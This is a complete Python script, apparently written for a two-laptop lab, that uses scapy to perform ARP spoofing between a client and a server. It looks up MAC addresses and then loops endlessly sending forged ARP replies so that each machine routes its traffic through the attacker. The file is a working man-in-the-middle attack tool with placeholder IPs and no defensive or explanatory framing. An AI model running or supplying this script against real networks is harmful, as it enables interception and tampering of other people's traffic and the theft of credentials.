import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

target_ip = "192.168.1.X"   # <-- LAPTOP 1 (CLIENT) KA IP
gateway_ip = "192.168.1.Y"  # <-- LAPTOP 2 (SERVER) KA IP

try:
    packets = 0
    print(f"[+] Spoofing {target_ip} and {gateway_ip}...")
    while True:
        spoof(target_ip, gateway_ip) 
        spoof(gateway_ip, target_ip) 
        packets += 2
        print(f"\r[+] Packets sent: {packets}", end="")
        sys.stdout.flush()
        time.sleep(2) 
except KeyboardInterrupt:
    print("\n[-] Attack stopped.")